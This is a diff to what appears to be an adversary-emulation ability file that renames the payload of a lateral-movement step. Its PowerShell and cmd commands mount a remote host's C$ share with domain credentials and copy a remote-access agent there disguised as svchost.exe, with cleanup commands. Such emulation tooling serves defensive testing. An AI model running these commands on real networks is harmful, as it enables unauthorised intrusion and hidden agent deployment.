@@ -16,11 +16,11 @@
           $secstr = New-Object -TypeName System.Security.SecureString;
           $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
           $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-          $path = $env:USERPROFILE+"\sandcat.go-windows";
+          $path = $env:USERPROFILE+"\#{sandcat.compile.name}-windows";
           $drive = "#{remote.host.ip}".replace(".","_");
           New-PSDrive -Name $drive -PSProvider FileSystem -Root "\\#{remote.host.ip}\C$" -Credential $cred;
           Copy-Item -Path $path -Destination $drive":\Users\Public\svchost.exe";
-        payload: sandcat.go-windows
+        payload: sandcat.go
         cleanup: |
           $drive = "#{remote.host.ip}".replace(".","_");
           Remove-Item -Path $drive":\Users\Public\svchost.exe" -Force;
@@ -28,8 +28,8 @@
       cmd:
         command: |
           net use \\#{remote.host.ip}\c$ /user:#{domain.user.name} #{domain.user.password} /persistent:no &
-          copy /B /Y sandcat.go-windows \\#{remote.host.ip}\c$\Users\Pubic\svchost.exe
-        payload: sandcat.go-windows
+          copy /B /Y #{sandcat.compile.name}-windows \\#{remote.host.ip}\c$\Users\Pubic\svchost.exe
+        payload: sandcat.go
         cleanup: |
           erase \\#{remote.host.ip}\c$\Users\Pubic\svchost.exe /Q /F &
           net use \\#{remote.host.ip}\c$ /delete
